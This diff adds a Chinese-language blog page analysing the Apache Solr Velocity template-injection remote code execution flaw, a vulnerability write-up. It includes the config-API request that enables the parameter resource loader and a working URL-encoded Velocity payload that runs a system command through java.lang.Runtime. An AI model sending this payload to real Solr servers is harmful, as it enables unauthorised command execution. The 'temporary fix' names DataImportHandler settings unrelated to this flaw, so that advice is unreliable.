@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="JAVA,漏洞分析,Solr," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="1、漏洞描述由于Solr默认未开启登录认证，只需请求/节点名/config,将配置项params.resource.loader.enabled设置为true，再构造链接即可让Solr中的Velocity模版引擎渲染传入的恶意模版，造成命令执行。 2、影响版本Apache Solr 5.x — Apache Solr 8.2.0 3、漏洞复现测试版本： Solr 8.2 首先登录solr控制台，直">
+<meta name="keywords" content="JAVA,漏洞分析,Solr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Solr Velocity 模板注入RCE漏洞分析">
+<meta property="og:url" content="http://yoursite.com/Apache Solr Velocity模板注入RCE漏洞分析/index.html">
+<meta property="og:site_name" content="水清云影&#39;s Blog">
+<meta property="og:description" content="1、漏洞描述由于Solr默认未开启登录认证，只需请求/节点名/config,将配置项params.resource.loader.enabled设置为true，再构造链接即可让Solr中的Velocity模版引擎渲染传入的恶意模版，造成命令执行。 2、影响版本Apache Solr 5.x — Apache Solr 8.2.0 3、漏洞复现测试版本： Solr 8.2 首先登录solr控制台，直">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwly1g9l2hiw5laj326a0h0wiw.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwly1g9l2oa8derj326i0fmtei.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwly1g9kzeyijesj320u0u07h3.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwly1g9kzj0jhv8j31k60aa41q.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwly1g9kzt66e2tj31op0u0tmt.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwly1g9l03dap0pj31nq0kwn32.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwly1g9l06ei1lzj31n60gowk8.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwly1g9l0btjp0dj31o00i4n30.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwly1g9l0zujn4yj31ns0kc0zb.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwly1g9l176mz3sj31gu0u04fk.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwly1g9l1pbi3q9j31my0qu7cq.jpg">
+<meta property="og:updated_time" content="2020-06-06T12:40:03.121Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Apache Solr Velocity 模板注入RCE漏洞分析">
+<meta name="twitter:description" content="1、漏洞描述由于Solr默认未开启登录认证，只需请求/节点名/config,将配置项params.resource.loader.enabled设置为true，再构造链接即可让Solr中的Velocity模版引擎渲染传入的恶意模版，造成命令执行。 2、影响版本Apache Solr 5.x — Apache Solr 8.2.0 3、漏洞复现测试版本： Solr 8.2 首先登录solr控制台，直">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/006tNbRwly1g9l2hiw5laj326a0h0wiw.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/Apache Solr Velocity模板注入RCE漏洞分析/"/>
+
+
+
+
+
+  <title>Apache Solr Velocity 模板注入RCE漏洞分析 | 水清云影's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">水清云影's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/Apache Solr Velocity模板注入RCE漏洞分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="水清云影's Blog">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/sqyy.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="水清云影's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Apache Solr Velocity 模板注入RCE漏洞分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-15T16:18:51+08:00">
+                2019-11-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="1、漏洞描述"><a href="#1、漏洞描述" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h2><p>由于Solr默认未开启登录认证，只需请求<strong>/节点名/config</strong>,将配置项<strong>params.resource.loader.enabled</strong>设置为<strong>true</strong>，再构造链接即可让Solr中的<strong>Velocity</strong>模版引擎渲染传入的<strong>恶意模版</strong>，造成命令执行。</p>
+<h2 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h2><p>Apache Solr 5.x — Apache Solr 8.2.0</p>
+<h2 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h2><p><strong>测试版本：</strong> Solr 8.2</p>
+<p>首先登录solr控制台，直接请求<strong>/节点名/config</strong>，修改配置项，Apache Solr默认集成<strong>VelocityResponseWriter</strong>插件，该插件初始化参数中的<strong>params.resource.loader.enabled</strong>默认值设置为false，但是可以通过POST请求直接修改配置项，将其设置为true。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">      &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">        &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">        &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">        &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">        &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">        &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l2hiw5laj326a0h0wiw.jpg" alt=""></p>
+<p>接下来就可以构造一个自定义的Velocity模版，实现执行任意系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l2oa8derj326i0fmtei.jpg" alt=""></p>
+<h2 id="4、漏洞分析"><a href="#4、漏洞分析" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h2><p>首先从payload触发的漏洞链入手，在</p>
+<p><code>/solr-8.2.0/solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java</code>处<strong>responseWriter</strong>进行调试</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9kzeyijesj320u0u07h3.jpg" alt=""></p>
+<p>跟进后，可以看到Solr是根据<strong>wt</strong>的参数值来确定数据的返回格式，也就是用<strong>Velocity</strong>来作为模板来渲染，如果模板的内容可控，我们就可以通过构造恶意模板来执行任意命令。</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9kzj0jhv8j31k60aa41q.jpg" alt=""></p>
+<p>往下走，会进入到<code>/solr-8.2.0/solr/core/src/java/org/apache/solr/response/QueryResponseWriterUtil.java</code>的<strong>writeQueryResponse</strong>方法</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9kzt66e2tj31op0u0tmt.jpg" alt=""></p>
+<p>继续跟进<code>/solr-8.2.0/solr/core/src/java/org/apache/solr/response/VelocityResponseWriter.java</code>中，因为payload中<strong>wt</strong>传入的参数是<strong>velocity</strong>，所以会创建对应的<strong>QueryResponseWriter</strong>的类型，为<strong>VelocityResponseWriter</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l03dap0pj31nq0kwn32.jpg" alt=""></p>
+<p>跟进<strong>createEngine()</strong>方法，这里Solr首先会创建一个模板引擎对象<strong>engine</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l06ei1lzj31n60gowk8.jpg" alt=""></p>
+<p>继续往下走，这里会判断<strong>VelocityResponseWriter</strong>插件的<strong>eparams.resource.loader.enabled</strong>选项是否为true。</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l0btjp0dj31o00i4n30.jpg" alt=""></p>
+<p>跟进<strong>SolrParamResourceLoader()</strong>到<code>/solr-8.2.0/solr/core/src/java/org/apache/solr/response/SolrParamResourceLoader.java</code>文件中</p>
+<p>如果ConfigAPI开启了<strong>params.resource.loader.enabled</strong>选项，就会从HTTP请求中获取参数，如模版名称。</p>
+<p>它会解析我们传入的参数，并对<strong>v.template</strong>参数进行处理</p>
+<p>解析了前端传来的所有参数，并对<code>v.template.</code>开头的参数进行处理，我们请求的参数为<strong>q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=恶意模版内容</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l0zujn4yj31ns0kc0zb.jpg" alt=""></p>
+<p>所以进入<strong>templates</strong>模版<strong>map</strong>的<strong>key</strong>是<strong>custom.vm</strong>，<strong>value</strong>就是我们指定的<strong>恶意模版内容</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l176mz3sj31gu0u04fk.jpg" alt=""></p>
+<p>然后我们会重新回到<code>/solr-8.2.0/solr/core/src/java/org/apache/solr/response/VelocityResponseWriter.java</code>中的<strong>write()</strong>方法</p>
+<p>不管<strong>wrapResponse</strong>是true或者false，最终都会被<strong>template.merge()</strong>，进行合并渲染，触发漏洞。</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9l1pbi3q9j31my0qu7cq.jpg" alt=""></p>
+<h2 id="5、漏洞修复"><a href="#5、漏洞修复" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h2><p>将Apache Solr升级至最新版本</p>
+<p>临时修补建议：</p>
+<ul>
+<li><p>编辑<code>solrconfig.xml</code>，将所有用固定值配置的<code>DataImportHandler</code>用法中的<code>dataConfig</code>参数设置为空字符串。</p>
+</li>
+<li><p>确保网络设置只允许可信的流量与Solr进行通信，特别是与DIH请求处理程序的通信。</p>
+</li>
+</ul>
+<h2 id="6、参考链接"><a href="#6、参考链接" class="headerlink" title="6、参考链接"></a>6、参考链接</h2><ul>
+<li><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></li>
+<li><a href="http://gv7.me/articles/2019/apache-solr-velocity-rce-20191031/" target="_blank" rel="noopener">http://gv7.me/articles/2019/apache-solr-velocity-rce-20191031/</a></li>
+<li><a href="https://xz.aliyun.com/t/6700" target="_blank" rel="noopener">https://xz.aliyun.com/t/6700</a></li>
+<li><a href="https://mp.weixin.qq.com/s/pPCNQoumpRvaUGkVxVvwBA?" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/pPCNQoumpRvaUGkVxVvwBA</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/JAVA/" rel="tag"># JAVA</a>
+          
+            <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
+          
+            <a href="/tags/Solr/" rel="tag"># Solr</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Hutool任意文件覆盖漏洞分析/" rel="next" title="Hutool任意文件覆盖漏洞分析">
+                <i class="fa fa-chevron-left"></i> Hutool任意文件覆盖漏洞分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/Log4j-反序列化漏洞分析/" rel="prev" title="Log4j 反序列化漏洞分析">
+                Log4j 反序列化漏洞分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/sqyy.jpeg"
+                alt="水清云影's Blog" />
+            
+              <p class="site-author-name" itemprop="name">水清云影's Blog</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、漏洞描述"><span class="nav-text">1、漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、影响版本"><span class="nav-text">2、影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、漏洞复现"><span class="nav-text">3、漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4、漏洞分析"><span class="nav-text">4、漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5、漏洞修复"><span class="nav-text">5、漏洞修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6、参考链接"><span class="nav-text">6、参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">水清云影's Blog</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
